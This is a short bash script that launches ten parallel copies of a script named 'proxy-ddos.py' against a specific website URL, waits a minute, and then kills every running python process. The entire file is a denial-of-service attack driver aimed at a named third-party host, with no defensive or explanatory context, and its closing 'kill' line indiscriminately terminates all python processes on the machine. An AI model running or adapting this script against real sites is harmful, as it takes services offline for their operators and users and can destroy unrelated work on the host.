#!/bin/bash

for i in {1..10};
do
    python proxy-ddos.py http://www.qzudui.com/index.php &
    echo $i
done

sleep 60

kill `pgrep python`
